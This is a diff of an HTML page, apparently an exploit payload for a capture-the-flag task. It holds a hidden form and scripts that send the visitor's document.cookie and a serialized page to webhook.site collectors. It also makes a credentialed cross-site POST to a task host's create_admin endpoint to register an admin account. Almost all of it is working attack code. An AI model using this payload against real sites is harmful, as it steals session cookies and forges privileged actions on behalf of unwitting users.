@@ -4,22 +4,25 @@
 
                     <iframe  name="frame"></iframe>
 
-                    <form method="post" action="https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a" target="frame" id="form">
+                    <form method="post" action="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005" target="frame" id="form">
                         <input type="hidden" name="cookie" id="cookie" value="CSRF" />
                         <input type="hidden" name="window" id="window" value="CSRF" />
                         <input type="hidden" name="user" value="tester" />
                     </form>
 
-                    <script>
-                    fetch('http://45.12.114.110:30031/table/view/1').then(async (res)=>{console.log(await res.text())})
-                        document.getElementById('cookie').value = 'ff'
-                        document.getElementById('window').value = JSON.stringify(document)
-                        document.getElementById('form').submit()
+                   <script>
+                    fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie).then(r=>r.text()).then(d=>console.log(d))
                     
-                    
-                      
-                      
-                      </script>
+                   fetch('https://tasks.goidactf.ru:20030/create_admin',
+                   {
+                    method:'POST',
+                    credentials:'include',
+                    headers:{
+                        'Content-Type':'application/x-www-form-urlencoded'
+                        },
+                    body:'new_admin_login=test_admin'
+                    }).then(r=>r.text()).then(d=>console.log(d))
+                    </script>
 
                 </body>
 </html>
